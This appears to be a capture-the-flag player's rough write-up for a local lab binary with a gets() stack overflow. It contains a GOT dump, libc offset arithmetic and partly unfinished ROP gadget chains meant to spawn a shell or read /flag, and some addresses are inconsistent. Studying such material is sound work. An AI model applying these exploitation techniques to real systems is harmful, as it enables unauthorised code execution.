# Player
- Tim Niklas Gruel 1080 2021 2831
- username: realy0sh1

# Writeup: "nuggets"
- story:  no story :/
- start docker:
```
docker compose up
nc 127.0.0.1 1024
```
- the c file allows for an buffer overflow (gets write into buffer until newline):
```
int main(void)
{
    char buffer[16];
    gets(buffer);
}
```
- compiler flags say no canary (-fno-stack-protector) and no ASLR (-no-pie)
- the library includes libc (which has ASLR enabled), but as vuln does not have ASLR enabled, the global offset table is at a well knwon address
```
.got:000000000041BF40 ; ===========================================================================
.got:000000000041BF40
.got:000000000041BF40 ; Segment type: Pure data
.got:000000000041BF40 ; Segment permissions: Read/Write
.got:000000000041BF40 _got            segment qword public 'DATA' use64
.got:000000000041BF40                 assume cs:_got
.got:000000000041BF40                 ;org 41BF40h
.got:000000000041BF40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got:000000000041BF48 qword_41BF48    dq 0                    ; DATA XREF: sub_401020↑r
.got:000000000041BF50 qword_41BF50    dq 0                    ; DATA XREF: sub_401020+6↑r
.got:000000000041BF58 __snprintf_chk_ptr dq offset __snprintf_chk
.got:000000000041BF58                                         ; DATA XREF: ___snprintf_chk↑r
.got:000000000041BF60 free_ptr        dq offset free          ; DATA XREF: _free↑r
.got:000000000041BF68 __errno_location_ptr dq offset __errno_location
.got:000000000041BF68                                         ; DATA XREF: ___errno_location↑r
.got:000000000041BF70 write_ptr       dq offset write         ; DATA XREF: _write↑r
.got:000000000041BF78 strlen_ptr      dq offset strlen        ; DATA XREF: _strlen↑r
.got:000000000041BF80 __stack_chk_fail_ptr dq offset __stack_chk_fail
.got:000000000041BF80                                         ; DATA XREF: ___stack_chk_fail↑r
.got:000000000041BF88 snprintf_ptr    dq offset snprintf      ; DATA XREF: _snprintf↑r
.got:000000000041BF90 memset_ptr      dq offset memset        ; DATA XREF: _memset↑r
.got:000000000041BF98 close_ptr       dq offset close         ; DATA XREF: _close↑r
.got:000000000041BFA0 memchr_ptr      dq offset memchr        ; DATA XREF: _memchr↑r
.got:000000000041BFA8 read_ptr        dq offset read          ; DATA XREF: _read↑r
.got:000000000041BFB0 memcpy_ptr      dq offset memcpy        ; DATA XREF: _memcpy↑r
.got:000000000041BFB8 gets_ptr        dq offset gets          ; DATA XREF: _gets↑r
.got:000000000041BFC0 malloc_ptr      dq offset malloc        ; DATA XREF: _malloc↑r
.got:000000000041BFC8 __vsnprintf_chk_ptr dq offset __vsnprintf_chk
.got:000000000041BFC8                                         ; DATA XREF: ___vsnprintf_chk↑r
.got:000000000041BFD0 memmove_ptr     dq offset memmove       ; DATA XREF: _memmove↑r
.got:000000000041BFD8 open_ptr        dq offset open          ; DATA XREF: _open↑r
.got:000000000041BFE0 lseek64_ptr     dq offset lseek64       ; DATA XREF: _lseek64↑r
.got:000000000041BFE8 strerror_ptr    dq offset strerror      ; DATA XREF: _strerror↑r
.got:000000000041BFF0 __libc_start_main_ptr dq offset __libc_start_main
.got:000000000041BFF0                                         ; DATA XREF: _start+1B↑r
.got:000000000041BFF8 __gmon_start___ptr dq offset __gmon_start__
.got:000000000041BFF8                                         ; DATA XREF: _init_proc+4↑r
.got:000000000041BFF8 _got            ends
.got:000000000041BFF8
```
- for example the address of the gets function is stored at address: 000000000041BFB8 (via IDA)
- the local offset of gets is: 0x76040 
- that means address_of_gets - local_offset_gets = ASLR_offset
- local offset_system: 0x4c490
- address of system: ASLR_offset + offset_system = address_of_gets - local_offset_gets + offset_system = address_of_gets - 0x76040 + 0x4c490 = address_of_gets - 0x29BB0
- address of string "/bin/sh\x00" : ASLR_offset + 0x196031 = address_of_gets - local_offset_gets + 0x196031 = address_of_gets - 0x76040 + 0x196031 = address_of_gets + 0x11FFF1
- find gadgets with ropper
```
ropper --file ./vuln
ropper --file ./vuln --search syscall
ropper --file ./vuln --inst-count 2
```
- in total we do the following rop chain
    - get address of system()
        - mov rax, [got_gets]
            g1: 0x0000000000403f62: pop rdx; ret; (set stack to got_gets 0x476040)
            g2: 0x000000000040a8ee: pop rax; ret; (set stack to 0x0000000000000000)
            g3: 0x0000000000410c70: mov rax, qword ptr [rdx + rax*8]; ret; 
        - sub rax, 0x29BB0
            g4: 0x0000000000403f62: pop rdx; ret; (set stack to 0x29BB0)
            g5: 0x0000000000411937: sub rax, rdx; ret;
        - pop rdi (on stack is address of /bin/bash)
            g6: 0x0000000000401465: pop rdi; ret;
        - call rax
            g7: 0x0000000000401010: call rax;



##### lets fucking go
- set rcx to value of our choise 
0x0000000000403f62: pop rdx; ret; 
0x000000000040d6c7: lea rcx, [rdx + 0x558]; sub rax, rcx; sar rax, 2; ret; 
- set rax to pointer to /bin/sh
0x0000000000403f62: pop rdx; ret; (set stack to got_gets 0x476040)
0x000000000040a8ee: pop rax; ret; (set stack to 0x0000000000000000)
0x0000000000410c70: mov rax, qword ptr [rdx + rax*8]; ret; 
0x0000000000403f62: pop rdx; ret; (offset to /bin/sh)
0x0000000000411937: sub rax, rdx; ret;
- push pointer to /bin/sh to stack and call rcx
0x000000000040d2ab: push rax; mov edx, 0x1bf8; mov esi, 1; call rcx; 
- rcx is this instruction
0x00000000004129a3: mov rdi, qword ptr [rsp + 8]; mov eax, dword ptr [rdi + 0x40]; add rsp, 0x18; ret; 
- then stack has instruction of next: (! now we may not modify rdi !)
0x0000000000403f62: pop rdx; ret; (set stack to got_gets 0x476040)
0x000000000040a8ee: pop rax; ret; (set stack to 0x0000000000000000)
0x0000000000410c70: mov rax, qword ptr [rdx + rax*8]; ret; 
- sub rax, 0x29BB0
0x0000000000403f62: pop rdx; ret; (set stack to 0x29BB0)
0x0000000000411937: sub rax, rdx; ret;
- now in rax is address of system() and in rdi is pointer to /bin/bash
0x0000000000401010: call rax;


#####

















- we have libz.a in binary without ASLR = known offsets
    - open('/flag')
        - first argument (rdi) is pointer to string/filename
            - 0x0000000000401465: pop rdi; ret; (b'/flag\x00\x00\x00' on stack)
        - second argument (rsi) are flags (set to 0 = readonly)
            - 0x0000000000404cc0: pop rsi; ret;  (b'\x00\x00\x00\x00\x00\x00\x00\x00' on stack)
        - open
        - now we have fd_flag in rax
    - write(fd_flag)
        - first argument (rdi) is output(stdout)
            - 0x0000000000401465: pop rdi; ret; (1 on stack)
        - second argument (rsi) is 


- we write b'/bin/sh\0x00' (8 bytes) to stack
- we use libz.a do to a ROP chain (rop-syscall-execv), we need the following gadgets:
    - pop rdi;ret; (and we write b'/bin/sh\0x00' to stack)
        - 0x0000000000401465: pop rdi; ret; 
    - mov rax, 59; ret; (write 59 to stack)
        - 0x000000000040a8ee: pop rax; ret;
    - mov rsi, 0; ret; (write 0 to stack)
        - 0x0000000000404cc0: pop rsi; ret; 
    - mov rdx, 0; ret; (write 0 to stack)
        - 0x0000000000403f62: pop rdx; ret; 
    - syscall;


